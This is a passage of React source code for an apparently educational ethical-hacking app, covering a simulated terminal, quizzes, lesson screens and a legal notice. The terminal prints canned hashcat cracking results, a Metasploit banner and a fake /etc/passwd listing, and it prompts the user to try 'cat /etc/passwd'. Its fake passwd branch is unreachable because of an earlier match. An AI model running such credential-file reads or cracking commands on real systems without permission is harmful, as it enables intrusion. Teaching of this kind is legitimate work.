      response = `Session..........: hashcat\nStatus...........: Running\nHash.Mode........: 0 (MD5)\nHash.Target......: hash.txt\nTime.Estimated...: 0 secs\nGuess.Base.......: File (rockyou.txt)\nSpeed.#1.........: 1234.5 MH/s\n\nCRACKED: 5f4dcc3b5aa765d61d8327deb882cf99:password\nCRACKED: e10adc3949ba59abbe56e057f20f883e:123456\n\nSession..........: Complete`;
    } else if (lower === "msfconsole" || lower === "msfconsole -q") {
      response = `       =[ metasploit v6.3.44-dev                          ]\n+ -- --=[ 2375 exploits - 1232 auxiliary - 417 post       ]\n+ -- --=[ 1389 payloads - 46 encoders - 11 nops            ]\n+ -- --=[ 9 evasion                                        ]\n\nmsf6 > `;
    } else if (lower.startsWith("echo")) {
      response = trimmed.slice(5);
    } else if (lower.startsWith("cat")) {
      const file = trimmed.split(" ")[1];
      response = file ? `cat: ${file}: No such file or directory (Try: cat /etc/passwd)` : "Usage: cat [file]";
    } else if (lower === "cat /etc/passwd") {
      response = `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nhacker:x:1000:1000:Ethical Hacker:/home/hacker:/bin/bash`;
    } else if (lower === "netstat -tulpn" || lower === "netstat") {
      response = `Active Internet connections\nProto Recv-Q Send-Q Local Address    Foreign Address  State    PID/Program\ntcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN   1023/sshd\ntcp        0      0 0.0.0.0:80       0.0.0.0:*        LISTEN   2048/apache2\ntcp        0      0 0.0.0.0:443      0.0.0.0:*        LISTEN   2048/apache2\ntcp        0      0 127.0.0.1:3306   0.0.0.0:*        LISTEN   1456/mysqld`;
    } else {
      response = `bash: ${trimmed.split(" ")[0]}: command not found\nHint: Type 'help' for available commands`;
    }

    response.split("\n").forEach(line => outputLines.push({ type: "output", text: line }));
    outputLines.push({ type: "prompt", text: "" });

    setTerminalLines(prev => {
      const withoutLastPrompt = prev.filter((_, i) => !(i === prev.length - 1 && prev[i].type === "prompt"));
      return [...withoutLastPrompt, ...outputLines];
    });
  }, []);

  const handleTermKey = (e) => {
    if (e.key === "Enter") {
      handleTermCommand(termInput);
      setTermInput("");
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      const idx = termHistIdx + 1;
      if (idx < termHistory.length) {
        setTermHistIdx(idx);
        setTermInput(termHistory[idx]);
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const idx = termHistIdx - 1;
      if (idx < 0) { setTermHistIdx(-1); setTermInput(""); }
      else { setTermHistIdx(idx); setTermInput(termHistory[idx]); }
    }
  };

  const startQuiz = (quiz, isModuleTest = false) => {
    setActiveQuiz({ questions: quiz, isModuleTest });
    setQuizAnswers({});
    setQuizSubmitted(false);
    setScreen(isModuleTest ? "moduleTest" : "quiz");
  };

  const submitQuiz = () => {
    setQuizSubmitted(true);
    const correct = activeQuiz.questions.filter((q, i) => quizAnswers[i] === q.answer).length;
    const total = activeQuiz.questions.length;
    const xpGain = Math.round((correct / total) * (activeQuiz.isModuleTest ? 300 : 100));
    setXp(x => x + xpGain);
    if (activeQuiz.isModuleTest && selectedModule) {
      markComplete(`module_${selectedModule.id}`, 0);
    }
  };

  const getModuleProgress = (mod) => {
    let done = 0, total = 0;
    mod.topics.forEach(t => {
      t.subtopics.forEach(s => { total++; if (progress[s.id]) done++; });
    });
    return total === 0 ? 0 : Math.round((done / total) * 100);
  };

  const xpToNextLevel = (level * 500) - xp;
  const xpPercent = Math.min(100, ((xp % 500) / 500) * 100);

  // ============ SCREENS ============

  if (screen === "boot") {
    return (
      <div style={{ background: "#0a0a0a", color: "#00ff88", fontFamily: "'Courier New', monospace", minHeight: "100vh", padding: "20px", fontSize: "13px" }}>
        {BOOT_LINES.slice(0, bootStep).map((line, i) => (
          <div key={i} style={{ color: line.includes("OK") ? "#00ff88" : line.includes("HACK") ? "#ff6b35" : "#00ff88", marginBottom: "2px", opacity: 0.9 }}>{line}</div>
        ))}
        <span style={{ animation: "blink 1s infinite" }}>█</span>
        <style>{`@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}`}</style>
      </div>
    );
  }

  if (screen === "terminal") {
    return (
      <div style={{ background: "#0d0d0d", minHeight: "100vh", display: "flex", flexDirection: "column", fontFamily: "'Courier New', monospace" }}>
        <div style={{ background: "#1a1a1a", padding: "8px 16px", display: "flex", justifyContent: "space-between", alignItems: "center", borderBottom: "1px solid #333" }}>
          <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
            <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#ff5f57" }}/>
            <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#ffbd2e" }}/>
            <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#28c840" }}/>
            <span style={{ color: "#666", fontSize: "12px", marginLeft: "8px" }}>root@hackacademy — bash — 120×40</span>
          </div>
          <button onClick={() => setScreen("home")} style={{ background: "none", border: "1px solid #333", color: "#888", padding: "4px 12px", cursor: "pointer", borderRadius: "4px", fontSize: "11px" }}>← Back to Academy</button>
        </div>
        <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{ flex: 1, padding: "16px", overflowY: "auto", cursor: "text", background: "#0d0d0d" }}>
          {terminalLines.map((line, i) => (
            <div key={i} style={{ color: line.type === "input" ? "#00ff88" : line.type === "system" ? "#4fc3f7" : "#e0e0e0", fontSize: "13px", lineHeight: "1.6", whiteSpace: "pre-wrap", fontFamily: "monospace" }}>
              {line.type === "prompt" ? (
                <span style={{ color: "#00ff88" }}>
                  root@hackacademy:~# {i === terminalLines.length - 1 && (
                    <span style={{ display: "inline-flex", alignItems: "center" }}>
                      <input ref={inputRef} value={termInput} onChange={e => setTermInput(e.target.value)} onKeyDown={handleTermKey}
                        style={{ background: "transparent", border: "none", outline: "none", color: "#e0e0e0", fontFamily: "monospace", fontSize: "13px", width: "60vw", caretColor: "#00ff88" }} autoFocus autoComplete="off" spellCheck={false} />
                    </span>
                  )}
                </span>
              ) : line.text}
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (screen === "quiz" || screen === "moduleTest") {
    const q = activeQuiz?.questions || [];
    const correct = q.filter((qu, i) => quizAnswers[i] === qu.answer).length;
    const pass = correct / q.length >= 0.6;

    return (
      <div style={{ background: "#070b12", minHeight: "100vh", color: "#e0e0e0", fontFamily: "'Space Mono', 'Courier New', monospace", padding: "24px" }}>
        <div style={{ maxWidth: "700px", margin: "0 auto" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "24px" }}>
            <div style={{ color: "#00ff88", fontSize: "18px", fontWeight: "bold" }}>
              {screen === "moduleTest" ? "⚡ MODULE TEST" : "📋 CHAPTER QUIZ"}
            </div>
            <button onClick={() => setScreen(screen === "moduleTest" ? "module" : "subtopic")} style={{ background: "none", border: "1px solid #333", color: "#888", padding: "6px 14px", cursor: "pointer", borderRadius: "4px" }}>← Back</button>
          </div>

          {q.map((qu, qi) => (
            <div key={qi} style={{ background: "#0f1520", border: `1px solid ${quizSubmitted ? (quizAnswers[qi] === qu.answer ? "#00ff88" : "#ff4444") : "#1e2a3a"}`, borderRadius: "8px", padding: "20px", marginBottom: "16px" }}>
              <div style={{ fontWeight: "bold", marginBottom: "14px", fontSize: "14px", color: "#e0e0e0" }}>
                Q{qi + 1}. {qu.q}
                {quizSubmitted && (quizAnswers[qi] === qu.answer ? " ✅" : " ❌")}
              </div>
              {qu.options.map((opt, oi) => (
                <div key={oi} onClick={() => !quizSubmitted && setQuizAnswers(a => ({ ...a, [qi]: oi }))}
                  style={{ padding: "10px 14px", marginBottom: "8px", borderRadius: "6px", cursor: quizSubmitted ? "default" : "pointer", border: `1px solid ${quizSubmitted ? (oi === qu.answer ? "#00ff88" : quizAnswers[qi] === oi ? "#ff4444" : "#1e2a3a") : (quizAnswers[qi] === oi ? "#00ff88" : "#1e2a3a")}`, background: quizSubmitted ? (oi === qu.answer ? "#003311" : quizAnswers[qi] === oi ? "#330000" : "#0a0f18") : (quizAnswers[qi] === oi ? "#001a0d" : "#0a0f18"), transition: "all 0.2s", fontSize: "13px" }}>
                  {String.fromCharCode(65 + oi)}. {opt}
                </div>
              ))}
              {quizSubmitted && quizAnswers[qi] !== qu.answer && (
                <div style={{ color: "#00ff88", fontSize: "12px", marginTop: "8px" }}>✓ Correct: {qu.options[qu.answer]}</div>
              )}
            </div>
          ))}

          {!quizSubmitted ? (
            <button onClick={submitQuiz} disabled={Object.keys(quizAnswers).length < q.length}
              style={{ width: "100%", padding: "14px", background: Object.keys(quizAnswers).length < q.length ? "#1e2a3a" : "#00ff88", color: Object.keys(quizAnswers).length < q.length ? "#555" : "#000", border: "none", borderRadius: "8px", cursor: Object.keys(quizAnswers).length < q.length ? "not-allowed" : "pointer", fontWeight: "bold", fontSize: "15px", fontFamily: "inherit" }}>
              SUBMIT ANSWERS ({Object.keys(quizAnswers).length}/{q.length})
            </button>
          ) : (
            <div style={{ textAlign: "center", padding: "24px", background: pass ? "#001a0d" : "#1a0000", borderRadius: "12px", border: `2px solid ${pass ? "#00ff88" : "#ff4444"}` }}>
              <div style={{ fontSize: "48px", marginBottom: "8px" }}>{pass ? "🎯" : "💀"}</div>
              <div style={{ fontSize: "24px", fontWeight: "bold", color: pass ? "#00ff88" : "#ff4444" }}>{correct}/{q.length} Correct</div>
              <div style={{ color: "#888", marginTop: "8px" }}>{pass ? `+${Math.round((correct/q.length)*300)} XP gained!` : "Score below 60%. Keep studying!"}</div>
              <button onClick={() => setScreen(screen === "moduleTest" ? "module" : "subtopic")} style={{ marginTop: "20px", padding: "12px 32px", background: "#00ff88", color: "#000", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold", fontFamily: "inherit" }}>← Continue</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  if (screen === "subtopic" && selectedSubtopic) {
    const parseContent = (content) => {
      const lines = content.split("\n");
      return lines.map((line, i) => {
        if (line.startsWith("# ")) return <h1 key={i} style={{ color: "#00ff88", fontSize: "22px", marginBottom: "12px", borderBottom: "1px solid #1e2a3a", paddingBottom: "8px" }}>{line.slice(2)}</h1>;
        if (line.startsWith("## ")) return <h2 key={i} style={{ color: "#4fc3f7", fontSize: "17px", margin: "18px 0 8px" }}>{line.slice(3)}</h2>;
        if (line.startsWith("### ")) return <h3 key={i} style={{ color: "#ff6b35", fontSize: "14px", margin: "14px 0 6px" }}>{line.slice(4)}</h3>;
        if (line.startsWith("```")) return null;
        if (line.startsWith("- ")) return <li key={i} style={{ color: "#b0bec5", marginLeft: "20px", marginBottom: "4px", fontSize: "13px" }}>{line.slice(2)}</li>;
        if (line.startsWith("> ")) return <blockquote key={i} style={{ borderLeft: "3px solid #ff6b35", paddingLeft: "12px", color: "#ff9f80", fontStyle: "italic", margin: "12px 0", fontSize: "13px" }}>{line.slice(2)}</blockquote>;
        if (line.startsWith("|")) return <div key={i} style={{ fontFamily: "monospace", fontSize: "12px", color: "#90a4ae", marginBottom: "2px" }}>{line}</div>;
        if (line === "") return <br key={i} />;
        // Code blocks
        if (line.startsWith("nmap") || line.startsWith("sqlmap") || line.startsWith("john") || line.startsWith("hashcat") || line.startsWith("dig") || line.startsWith("whois") || line.startsWith("msfconsole") || (line.startsWith("#") && i > 0)) {
          return <code key={i} style={{ display: "block", background: "#0a0f18", border: "1px solid #1e2a3a", borderRadius: "4px", padding: "2px 8px", color: "#00ff88", fontFamily: "monospace", fontSize: "12px", margin: "2px 0" }}>{line}</code>;
        }
        return <p key={i} style={{ color: "#b0bec5", fontSize: "13px", lineHeight: "1.7", margin: "4px 0" }}>{line}</p>;
      });
    };

    // Extract code blocks
    const codeBlocks = [];
    let inCode = false, currentBlock = [];
    selectedSubtopic.content.split("\n").forEach(line => {
      if (line.startsWith("```")) { if (inCode) { codeBlocks.push(currentBlock.join("\n")); currentBlock = []; } inCode = !inCode; }
      else if (inCode) currentBlock.push(line);
    });

    return (
      <div style={{ background: "#070b12", minHeight: "100vh", color: "#e0e0e0", fontFamily: "'Space Mono', 'Courier New', monospace" }}>
        <div style={{ background: "#0f1520", borderBottom: "1px solid #1e2a3a", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <div style={{ display: "flex", gap: "8px" }}>
            <button onClick={() => setScreen("home")} style={{ ...btnStyle }}>🏠</button>
            <button onClick={() => setScreen("module")} style={{ ...btnStyle }}>← {selectedModule?.title}</button>
          </div>
          <button onClick={() => { markComplete(selectedSubtopic.id, 50); setScreen("module"); }} style={{ background: "#00ff88", color: "#000", border: "none", padding: "6px 16px", borderRadius: "6px", cursor: "pointer", fontWeight: "bold", fontSize: "12px", fontFamily: "inherit" }}>✓ Mark Complete</button>
        </div>

        <div style={{ maxWidth: "780px", margin: "0 auto", padding: "28px 24px" }}>
          <div style={{ marginBottom: "24px" }}>
            <div style={{ color: "#666", fontSize: "11px", marginBottom: "6px" }}>LESSON</div>
            <h1 style={{ color: "#e0e0e0", fontSize: "20px", margin: 0 }}>{selectedSubtopic.title}</h1>
          </div>

          <div style={{ background: "#0f1520", borderRadius: "10px", padding: "24px", border: "1px solid #1e2a3a", marginBottom: "20px" }}>
            {parseContent(selectedSubtopic.content)}
            {codeBlocks.length > 0 && codeBlocks.map((block, i) => (
              <div key={i} style={{ background: "#040810", border: "1px solid #1e2a3a", borderRadius: "8px", padding: "16px", marginTop: "12px", position: "relative" }}>
                <div style={{ color: "#666", fontSize: "10px", marginBottom: "8px" }}>TERMINAL CODE</div>
                <pre style={{ color: "#00ff88", fontFamily: "monospace", fontSize: "12px", margin: 0, whiteSpace: "pre-wrap", lineHeight: "1.6" }}>{block}</pre>
              </div>
            ))}
          </div>

          <button onClick={() => setScreen("terminal")} style={{ width: "100%", padding: "14px", background: "#0f1520", border: "1px solid #00ff88", color: "#00ff88", borderRadius: "8px", cursor: "pointer", fontWeight: "bold", fontSize: "13px", fontFamily: "inherit", marginBottom: "10px" }}>
            💻 Practice in Terminal →
          </button>
          <button onClick={() => { markComplete(selectedSubtopic.id, 50); setScreen("module"); }} style={{ width: "100%", padding: "14px", background: "#00ff88", border: "none", color: "#000", borderRadius: "8px", cursor: "pointer", fontWeight: "bold", fontSize: "13px", fontFamily: "inherit" }}>
            ✓ Complete & Continue →
          </button>
        </div>
      </div>
    );
  }

  if (screen === "module" && selectedModule) {
    const pct = getModuleProgress(selectedModule);
    return (
      <div style={{ background: "#070b12", minHeight: "100vh", color: "#e0e0e0", fontFamily: "'Space Mono', 'Courier New', monospace" }}>
        <div style={{ background: "#0f1520", borderBottom: "1px solid #1e2a3a", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <button onClick={() => setScreen("home")} style={btnStyle}>← Home</button>
          <div style={{ color: selectedModule.color, fontWeight: "bold" }}>{selectedModule.icon} {selectedModule.title}</div>
          <div style={{ color: "#888", fontSize: "11px" }}>{pct}% complete</div>
        </div>

        <div style={{ maxWidth: "780px", margin: "0 auto", padding: "24px" }}>
          <div style={{ background: "#0f1520", borderRadius: "10px", padding: "20px", marginBottom: "20px", border: `1px solid ${selectedModule.color}33` }}>
            <div style={{ fontSize: "36px", marginBottom: "8px" }}>{selectedModule.icon}</div>
            <h2 style={{ color: selectedModule.color, margin: "0 0 8px" }}>{selectedModule.title}</h2>
            <p style={{ color: "#888", fontSize: "12px", margin: 0 }}>{selectedModule.description}</p>
            <div style={{ marginTop: "14px", background: "#0a0f18", borderRadius: "4px", height: "6px" }}>
              <div style={{ background: selectedModule.color, height: "100%", width: `${pct}%`, borderRadius: "4px", transition: "width 0.5s" }} />
            </div>
          </div>

          {selectedModule.topics.map((topic, ti) => (
            <div key={topic.id} style={{ marginBottom: "16px" }}>
              <div style={{ color: "#4fc3f7", fontSize: "13px", fontWeight: "bold", marginBottom: "10px", display: "flex", alignItems: "center", gap: "8px" }}>
                <span style={{ color: "#666" }}>#{ti + 1}</span> {topic.title}
              </div>
              {topic.subtopics.map(sub => (
                <div key={sub.id} onClick={() => { setSelectedSubtopic(sub); setScreen("subtopic"); }}
                  style={{ background: progress[sub.id] ? "#001a0d" : "#0f1520", border: `1px solid ${progress[sub.id] ? "#00ff88" : "#1e2a3a"}`, borderRadius: "8px", padding: "14px 18px", marginBottom: "8px", cursor: "pointer", display: "flex", justifyContent: "space-between", alignItems: "center", transition: "all 0.2s" }}>
                  <div style={{ fontSize: "13px" }}>{progress[sub.id] ? "✅" : "📄"} {sub.title}</div>
                  <div style={{ color: "#666", fontSize: "11px" }}>{progress[sub.id] ? "Done" : "→"}</div>
                </div>
              ))}
              <div onClick={() => startQuiz(topic.quiz)}
                style={{ background: "#0a0f18", border: "1px dashed #1e2a3a", borderRadius: "8px", padding: "12px 18px", marginBottom: "8px", cursor: "pointer", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div style={{ color: "#ff6b35", fontSize: "12px" }}>📋 Chapter Quiz — {topic.title}</div>
                <div style={{ color: "#666", fontSize: "11px" }}>{topic.quiz.length} questions →</div>
              </div>
            </div>
          ))}

          <div onClick={() => startQuiz(selectedModule.moduleTest, true)}
            style={{ background: "#0f1520", border: `2px solid ${selectedModule.color}`, borderRadius: "10px", padding: "18px", cursor: "pointer", textAlign: "center", marginTop: "20px" }}>
            <div style={{ fontSize: "24px", marginBottom: "6px" }}>⚡</div>
            <div style={{ color: selectedModule.color, fontWeight: "bold", fontSize: "14px" }}>MODULE TEST — {selectedModule.title}</div>
            <div style={{ color: "#888", fontSize: "11px", marginTop: "4px" }}>Complete the full module test to unlock the next module</div>
          </div>
        </div>
      </div>
    );
  }

  // ============ HOME ============
  const totalXP = CURRICULUM.reduce((s, m) => s + m.xp, 0);
  const rank = level <= 3 ? "Script Kiddie" : level <= 6 ? "Recon Specialist" : level <= 10 ? "Penetration Tester" : level <= 15 ? "Elite Hacker" : "Ghost Operative";

  return (
    <div style={{ background: "#070b12", minHeight: "100vh", color: "#e0e0e0", fontFamily: "'Space Mono', 'Courier New', monospace" }}>
      {/* Header */}
      <div style={{ background: "#0a0f1a", borderBottom: "1px solid #1e2a3a", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center", position: "sticky", top: 0, zIndex: 100 }}>
        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
          <div style={{ color: "#00ff88", fontSize: "18px", fontWeight: "bold", letterSpacing: "2px" }}>HACK<span style={{ color: "#ff6b35" }}>ACADEMY</span></div>
          <div style={{ background: "#001a0d", border: "1px solid #00ff88", color: "#00ff88", fontSize: "9px", padding: "2px 6px", borderRadius: "3px" }}>ETHICAL</div>
        </div>
        <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
          <button onClick={() => setScreen("terminal")} style={{ background: "#0f1520", border: "1px solid #00ff88", color: "#00ff88", padding: "6px 14px", cursor: "pointer", borderRadius: "6px", fontSize: "11px", fontFamily: "inherit" }}>💻 Terminal</button>
          <div style={{ background: "#0f1520", border: "1px solid #1e2a3a", borderRadius: "6px", padding: "6px 12px", fontSize: "11px" }}>
            <span style={{ color: "#ff6b35" }}>LVL {level}</span> <span style={{ color: "#666" }}>·</span> <span style={{ color: "#00ff88" }}>⚡{xp} XP</span>
          </div>
        </div>
      </div>

      {/* Hero Section */}
      <div style={{ background: "linear-gradient(180deg, #0a0f1a 0%, #070b12 100%)", padding: "36px 24px 28px", textAlign: "center", borderBottom: "1px solid #1e2a3a", position: "relative", overflow: "hidden" }}>
        <div style={{ position: "absolute", top: 0, left: 0, right: 0, bottom: 0, backgroundImage: "radial-gradient(circle at 20% 50%, #00ff8811 0%, transparent 50%), radial-gradient(circle at 80% 20%, #ff6b3511 0%, transparent 50%)", pointerEvents: "none" }} />
        <div style={{ fontSize: "11px", color: "#00ff88", letterSpacing: "4px", marginBottom: "10px" }}>{"// MISSION BRIEFING"}</div>
        <h1 style={{ color: "#e0e0e0", fontSize: "28px", margin: "0 0 10px", letterSpacing: "1px" }}>
          Master <span style={{ color: "#00ff88" }}>Ethical Hacking</span>
        </h1>
        <p style={{ color: "#666", fontSize: "12px", maxWidth: "500px", margin: "0 auto 20px", lineHeight: "1.8" }}>
          From zero to elite. Learn offensive security to defend your nation. Real tools. Real labs. Real hacker mindset.
        </p>
        <div style={{ display: "flex", justifyContent: "center", gap: "12px", flexWrap: "wrap" }}>
          {[["🎯 Rank", rank], ["⚡ XP", `${xp} / ${totalXP}`], ["📚 Modules", `${CURRICULUM.length} Total`], ["💻 Terminal", "Live Lab"]].map(([k, v]) => (
            <div key={k} style={{ background: "#0f1520", border: "1px solid #1e2a3a", borderRadius: "8px", padding: "10px 16px", minWidth: "100px", textAlign: "center" }}>
              <div style={{ color: "#888", fontSize: "10px" }}>{k}</div>
              <div style={{ color: "#00ff88", fontSize: "13px", fontWeight: "bold", marginTop: "2px" }}>{v}</div>
            </div>
          ))}
        </div>
        {/* XP Bar */}
        <div style={{ maxWidth: "400px", margin: "18px auto 0" }}>
          <div style={{ display: "flex", justifyContent: "space-between", fontSize: "10px", color: "#555", marginBottom: "4px" }}>
            <span>Level {level}: {rank}</span><span>{xpToNextLevel} XP to Level {level + 1}</span>
          </div>
          <div style={{ background: "#0a0f18", borderRadius: "4px", height: "8px", border: "1px solid #1e2a3a" }}>
            <div style={{ background: "linear-gradient(90deg, #00ff88, #4fc3f7)", height: "100%", width: `${xpPercent}%`, borderRadius: "4px", transition: "width 0.5s", boxShadow: "0 0 8px #00ff8866" }} />
          </div>
        </div>
      </div>

      {/* Modules Grid */}
      <div style={{ maxWidth: "900px", margin: "0 auto", padding: "28px 20px" }}>
        <div style={{ fontSize: "11px", color: "#666", letterSpacing: "2px", marginBottom: "18px" }}>{"// MISSION MODULES"}</div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))", gap: "16px" }}>
          {CURRICULUM.map((mod, mi) => {
            const pct = getModuleProgress(mod);
            const unlocked = mi === 0 || progress[`module_${CURRICULUM[mi - 1].id}`];
            return (
              <div key={mod.id} onClick={() => { if (unlocked) { setSelectedModule(mod); setScreen("module"); } }}
                style={{ background: "#0f1520", border: `1px solid ${unlocked ? mod.color + "44" : "#1e2a3a"}`, borderRadius: "12px", padding: "20px", cursor: unlocked ? "pointer" : "not-allowed", opacity: unlocked ? 1 : 0.5, transition: "all 0.2s", position: "relative", overflow: "hidden" }}>
                <div style={{ position: "absolute", top: 0, right: 0, width: "80px", height: "80px", background: `radial-gradient(circle at 100% 0%, ${mod.color}11, transparent 70%)`, pointerEvents: "none" }} />
                <div style={{ fontSize: "32px", marginBottom: "10px" }}>{unlocked ? mod.icon : "🔒"}</div>
                <div style={{ color: mod.color, fontWeight: "bold", fontSize: "14px", marginBottom: "6px" }}>{mod.title}</div>
                <div style={{ color: "#666", fontSize: "11px", marginBottom: "14px", lineHeight: "1.6" }}>{mod.description}</div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "10px" }}>
                  <div style={{ color: "#888", fontSize: "10px" }}>{mod.topics.length} topics · {mod.xp} XP</div>
                  <div style={{ color: pct === 100 ? "#00ff88" : "#666", fontSize: "11px" }}>{pct}%</div>
                </div>
                <div style={{ background: "#0a0f18", borderRadius: "4px", height: "4px" }}>
                  <div style={{ background: mod.color, height: "100%", width: `${pct}%`, borderRadius: "4px", transition: "width 0.5s" }} />
                </div>
                {!unlocked && <div style={{ color: "#555", fontSize: "10px", marginTop: "8px" }}>Complete previous module to unlock</div>}
              </div>
            );
          })}
        </div>

        {/* App Download Section */}
        <div style={{ background: "#0f1520", border: "1px solid #1e2a3a", borderRadius: "12px", padding: "24px", marginTop: "28px", textAlign: "center" }}>
          <div style={{ fontSize: "28px", marginBottom: "10px" }}>📱</div>
          <div style={{ color: "#4fc3f7", fontWeight: "bold", fontSize: "15px", marginBottom: "8px" }}>Download HackAcademy App</div>
          <div style={{ color: "#666", fontSize: "11px", marginBottom: "18px" }}>Take your hacking education offline. Practice anywhere.</div>
          <div style={{ display: "flex", gap: "12px", justifyContent: "center", flexWrap: "wrap" }}>
            {[["📱 Android APK", "#00ff88"], ["🍎 iOS TestFlight", "#4fc3f7"], ["🐧 Linux .deb", "#ff6b35"]].map(([label, color]) => (
              <button key={label} style={{ background: "#0a0f18", border: `1px solid ${color}`, color: color, padding: "10px 20px", borderRadius: "8px", cursor: "pointer", fontFamily: "inherit", fontSize: "12px", fontWeight: "bold" }}>
                {label} ↓
              </button>
            ))}
          </div>
          <div style={{ color: "#333", fontSize: "10px", marginTop: "12px" }}>End-to-end encrypted · No data collected · Open source</div>
        </div>

        {/* Security Notice */}
        <div style={{ background: "#0a0500", border: "1px solid #ff6b3544", borderRadius: "8px", padding: "14px 18px", marginTop: "16px" }}>
          <div style={{ color: "#ff6b35", fontSize: "11px", fontWeight: "bold", marginBottom: "4px" }}>⚠ LEGAL NOTICE</div>
          <div style={{ color: "#555", fontSize: "11px", lineHeight: "1.7" }}>
            All techniques taught here are for <strong style={{ color: "#ff9f80" }}>authorized security testing only</strong>. 
            Unauthorized access to computer systems is illegal under national and international law. 
            Always obtain written permission before testing any system. Use your skills to protect, not harm.
          </div>
        </div>
      </div>
    </div>
  );
}

const btnStyle = {
  background: "none",
  border: "1px solid #1e2a3a",
  color: "#888",
  padding: "5px 12px",
  cursor: "pointer",
  borderRadius: "5px",
  fontSize: "12px",
  fontFamily: "inherit",
};
